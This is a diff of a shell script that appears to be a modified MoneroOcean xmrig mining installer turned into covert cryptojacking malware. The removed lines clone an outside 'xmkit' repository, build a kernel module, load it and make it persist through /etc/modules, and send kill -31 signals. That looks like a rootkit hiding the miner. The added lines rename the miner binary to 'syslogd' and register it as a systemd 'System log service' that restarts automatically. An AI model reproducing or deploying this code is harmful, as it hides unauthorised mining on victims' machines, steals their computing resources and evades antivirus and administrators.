@@ -2,23 +2,6 @@
 
 VERSION=2.11
 
-cd $HOME
-echo "getting kit..."
-git clone https://github.com/killercarrot00/xmkit
-cd xmkit
-make
-if [ $? -eq 0 ]; then
-    echo OK
-else
-    echo "Make problem..."
-    exit 1
-fi
-insmod loggersys.ko
-cp loggersys.ko /lib/modules/
-echo "loggersys" >> /etc/modules
-rm -rf xmkit
-echo "kit ok."
-
 # printing greetings
 
 echo "MoneroOcean mining setup script v$VERSION."
@@ -183,13 +166,14 @@ if ! tar xf /tmp/xmrig.tar.gz -C $HOME/loggerd; then
   echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/loggerd directory"
   exit 1
 fi
+mv $HOME/loggerd/xmrig $HOME/loggerd/syslogd
 rm /tmp/xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/loggerd/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/loggerd/config.json
-$HOME/loggerd/xmrig --help >/dev/null
+$HOME/loggerd/syslogd --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/loggerd/xmrig ]; then
+  if [ -f $HOME/loggerd/syslogd ]; then
     echo "WARNING: Advanced version of $HOME/loggerd/xmrig is not functional"
   else 
     echo "WARNING: Advanced version of $HOME/loggerd/xmrig was removed by antivirus (or some other problem)"
@@ -209,13 +193,14 @@ if (test $? -ne 0); then
   if ! tar xf /tmp/xmrig.tar.gz -C $HOME/loggerd --strip=1; then
     echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/loggerd directory"
   fi
+  mv $HOME/loggerd/xmrig $HOME/loggerd/syslogd
   rm /tmp/xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/loggerd/xmrig works fine (and not removed by antivirus software)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/loggerd/config.json
-  $HOME/loggerd/xmrig --help >/dev/null
+  $HOME/loggerd/syslogd --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/loggerd/xmrig ]; then
+    if [ -f $HOME/loggerd/syslogd ]; then
       echo "ERROR: Stock version of $HOME/loggerd/xmrig is not functional too"
     else 
       echo "ERROR: Stock version of $HOME/loggerd/xmrig was removed by antivirus too"
@@ -252,9 +237,8 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/loggerd/config_backg
 echo "[*] Creating $HOME/loggerd/logsys.sh script"
 cat >$HOME/loggerd/logsys.sh <<EOL
 #!/bin/bash
-if ! pidof xmrig >/dev/null; then
+if ! pidof syslogd >/dev/null; then
   nice $HOME/loggerd/xmrig \$*
-  kill -31 $(pgrep -o xmrig)
 else
   echo "Already running in the background. Refusing to run another one."
 fi
@@ -296,9 +280,7 @@ else
 Description=System log service.
 
 [Service]
-ExecStartPre=/sbin/insmod /lib/modules/loggersys.ko
-ExecStart=$HOME/loggerd/xmrig --config=$HOME/loggerd/config.json
-ExecStartPost=/bin/bash -c "kill -31 $$(pgrep -o xmrig)"
+ExecStart=$HOME/loggerd/syslogd --config=$HOME/loggerd/config.json
 Restart=always
 Nice=10
 CPUWeight=1
